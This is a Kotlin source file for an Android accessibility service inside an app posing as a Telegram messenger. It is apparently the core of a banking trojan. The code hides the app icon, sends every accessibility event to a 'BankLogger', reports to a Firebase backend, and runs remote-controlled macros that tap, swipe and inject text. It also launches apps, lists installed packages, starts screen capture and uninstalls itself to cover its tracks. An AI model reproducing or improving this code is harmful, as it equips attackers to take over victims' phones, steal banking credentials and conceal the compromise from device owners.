// FILE: app/src/main/java/com/telegram2/messaging/remote/MyAccessibilityService.kt
package com.telegram2.messaging.remote

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.GestureDescription
import android.content.ComponentName
import android.content.Intent
import android.graphics.Path
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.telegram2.messaging.ScreenPermissionActivity
import java.util.concurrent.CountDownLatch

class MyAccessibilityService : AccessibilityService() {

    companion object {
        var instance: MyAccessibilityService? = null
    }

    internal val mainHandler = Handler(Looper.getMainLooper())
    var macroRunning = false

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            notificationTimeout = 100
        }
        sendScreenInfo()
        hideAppIcon()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        BankLogger.onEvent(this, event)
    }

    override fun onInterrupt() {}

    fun executeMacro(macroId: String, steps: List<MacroRunner.MacroStep>) {
        if (macroRunning) return
        macroRunning = true
        MacroRunner.start(macroId, steps, this) { success, summary ->
            macroRunning = false
            FirebaseBridge.reportMacro(macroId, success, summary)
        }
    }

    fun tap(x: Int, y: Int) {
        val path = Path().apply { moveTo(x.toFloat(), y.toFloat()) }
        dispatchGesture(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 50))
            .build(), null, null)
    }

    fun swipe(x1: Int, y1: Int, x2: Int, y2: Int, dur: Long) {
        val path = Path().apply { moveTo(x1.toFloat(), y1.toFloat()); lineTo(x2.toFloat(), y2.toFloat()) }
        dispatchGesture(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, dur))
            .build(), null, null)
    }

    fun injectText(text: String) {
        val root = rootInActiveWindow ?: return
        val focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
        if (focused != null) {
            val bundle = Bundle().apply {
                putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
            }
            focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, bundle)
        }
    }

    fun hideAppIcon() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, "com.telegram2.messaging.MainActivity"),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}
    }

    fun uninstallSelf() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = android.net.Uri.parse("package:$packageName")
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        startActivity(intent)
        mainHandler.postDelayed({
            val root = rootInActiveWindow ?: return@postDelayed
            val uninstallBtn = findClickableByText(root, "Uninstall")
            if (uninstallBtn != null) {
                uninstallBtn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                mainHandler.postDelayed({
                    val confirmRoot = rootInActiveWindow ?: return@postDelayed
                    val okBtn = findClickableByText(confirmRoot, "OK")
                        ?: findClickableByText(confirmRoot, "Uninstall")
                        ?: findClickableByViewId(confirmRoot, "android:id/button1")
                    okBtn?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                }, 1500)
            }
        }, 2000)
    }

    fun startScreenCapture() {
        startActivity(Intent(this, ScreenPermissionActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        })
    }

    fun stopScreenCapture() {
        val intent = Intent(this, ScreenCaptureService::class.java).apply {
            action = "stop"
        }
        stopService(intent)
    }

    fun getInstalledApps(): List<String> = packageManager.getInstalledPackages(0).map { it.packageName }

    private fun sendScreenInfo() {
        val dm = resources.displayMetrics
        FirebaseBridge.updateScreenInfo(dm.widthPixels, dm.heightPixels)
    }

    fun launchApp(pkg: String): Boolean {
        val intent = packageManager.getLaunchIntentForPackage(pkg) ?: return false
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
        return true
    }

    inline fun runOnMainThreadSync(crossinline block: () -> Any?): Any? {
        val latch = CountDownLatch(1)
        var result: Any? = null
        mainHandler.post {
            result = block()
            latch.countDown()
        }
        latch.await()
        return result
    }

    private fun findClickableByText(root: AccessibilityNodeInfo, text: String): AccessibilityNodeInfo? {
        for (node in root.findAccessibilityNodeInfosByText(text)) {
            if (node.isClickable) return node
        }
        return null
    }

    private fun findClickableByViewId(root: AccessibilityNodeInfo, id: String): AccessibilityNodeInfo? {
        for (node in root.findAccessibilityNodeInfosByViewId(id)) {
            if (node.isClickable) return node
        }
        return null
    }
}